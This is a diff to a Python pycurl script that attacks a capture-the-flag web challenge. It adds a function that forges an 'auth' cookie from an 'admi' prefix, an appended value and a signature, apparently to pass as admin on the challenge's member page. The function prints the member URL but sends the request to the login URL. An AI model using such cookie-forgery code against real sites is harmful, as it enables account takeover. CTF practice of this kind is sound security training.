@@ -6,6 +6,8 @@ from io import BytesIO
 
 URL_REGISTER = 'http://stickitup.chall.malicecyber.com/register.php'
 URL_LOGIN = 'http://stickitup.chall.malicecyber.com/login.php'
+URL_MEMBER = 'http://stickitup.chall.malicecyber.com/member.php'
+
 BINPATH = './bin/macos/'
 MAXLEN = 56
 
@@ -102,6 +104,31 @@ def stick_login(email, password):
             'Content-Type: application/x-www-form-urlencoded',
             'X-Requested-With: XMLHttpRequest',
             #'Set-Cookie: ' + SESSION
+        ])
+        c.perform()
+        return c.getinfo(pycurl.HTTP_CODE), b
+    finally:
+        c.close()
+
+def stick_member(append, signature, prefix='admi'):
+
+    auth=prefix + append + '%3A' + signature
+
+    try:
+        c = pycurl.Curl() 
+        url = URL_MEMBER
+        print(url)
+        c.setopt(pycurl.URL, URL_LOGIN)
+        #c.setopt(pycurl.WRITEFUNCTION, lambda x: None)
+        b = BytesIO()
+        c.setopt(pycurl.WRITEDATA, b)
+        c.setopt(pycurl.HTTPHEADER, [
+            'Accept-Language: fr-fr', 
+            'Upgrade-Insecure-Requests: 1', 
+            'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15', 
+            'Content-Type: application/x-www-form-urlencoded',
+            'X-Requested-With: XMLHttpRequest',
+            'Cookie: auth=' + auth
         ])
         c.perform()
         return c.getinfo(pycurl.HTTP_CODE), b
